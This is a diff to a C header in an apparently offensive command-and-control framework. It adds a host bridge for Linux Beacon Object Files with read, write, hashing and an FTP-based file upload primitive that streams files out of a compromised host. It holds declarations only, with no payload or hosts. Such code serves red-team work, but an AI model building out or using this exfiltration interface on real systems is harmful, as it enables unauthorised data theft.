@@ -35,9 +35,35 @@ c2_status c2_bof_pack_args(const c2_str *args, size_t argc, uint8_t *out,
                            size_t out_cap, size_t *out_len);
 
 /*
+ * Host primitives a BOF reaches through the loader's Beacon compatibility
+ * layer. Each returns 0 on success and a negative status on failure.
+ */
+typedef int (*c2_bof_read_fn)(void *ctx, const char *path, uint8_t **out,
+                              size_t *len, char *err, int err_cap);
+typedef int (*c2_bof_write_fn)(void *ctx, const char *path, const uint8_t *data,
+                               size_t len, char *err, int err_cap);
+/* Upload the file at `path` (a memfs key or a disk path) from `offset` on,
+ * over the FTP route named by `token`. The agent streams it, so the BOF never
+ * holds the file in memory. */
+typedef int (*c2_bof_upload_fn)(void *ctx, const char *token, const char *path,
+                                unsigned long offset, char *err, int err_cap);
+typedef int (*c2_bof_sha256_fn)(void *ctx, const uint8_t *data, size_t len,
+                                char *hex, size_t hex_cap, char *err,
+                                int err_cap);
+
+typedef struct {
+  void *ctx;
+  c2_bof_read_fn read;
+  c2_bof_write_fn write;
+  c2_bof_upload_fn upload;
+  c2_bof_sha256_fn sha256;
+} c2_bof_host;
+
+/*
  * Run a Linux relocatable BOF. `loader_so` is the coffloader_linux.so image,
  * `bof` the relocatable object, `export_name` the entry (NULL/"" means "go"),
- * and `args`/`args_len` the packed argument blob (may be NULL/0).
+ * `args`/`args_len` the packed argument blob (may be NULL/0), and `host` the
+ * optional host bridge installed before the entry runs.
  *
  * On C2_OK *out is a NUL-terminated malloc'd string (possibly empty) that the
  * caller frees with free(); it is never NULL on C2_OK. On failure *out is set
@@ -47,7 +73,7 @@ c2_status c2_bof_pack_args(const c2_str *args, size_t argc, uint8_t *out,
 c2_status c2_bof_run(const uint8_t *loader_so, size_t loader_len,
                      const uint8_t *bof, size_t bof_len,
                      const char *export_name, const uint8_t *args,
-                     size_t args_len, char **out);
+                     size_t args_len, const c2_bof_host *host, char **out);
 
 #ifdef __cplusplus
 }
